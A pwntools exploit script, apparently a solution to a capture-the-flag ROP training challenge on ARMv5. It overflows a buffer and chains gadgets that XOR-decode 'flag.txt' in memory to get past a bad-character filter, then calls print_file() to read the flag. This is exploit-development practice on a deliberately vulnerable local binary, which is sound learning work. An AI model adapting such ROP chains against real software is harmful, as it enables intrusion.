#!/usr/bin/python3
from pwn import process, p32, xor, log

shell = process("./badchars_armv5")

offset = 44
junk = b"A" * offset

string = xor(b"flag.txt", 2)

payload  = b""
payload += junk

for i in range(0, len(string), 4):
     payload += p32(0x10614)     # pop {r5, r6, pc};
     payload += p32(0x21024 + i) # .data
     payload += p32(0x02020202)  # xor value
     payload += p32(0x10618)     # ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
     payload += p32(0x0)         # padding for pop

     payload += p32(0x10614)     # pop {r5, r6, pc};
     payload += p32(0x21024 + i) # .data
     payload += string[i:i+4]    # string
     payload += p32(0x10618)     # ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
     payload += p32(0x21024)     # "flag.txt"

payload += p32(0x105e0) # print_file()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
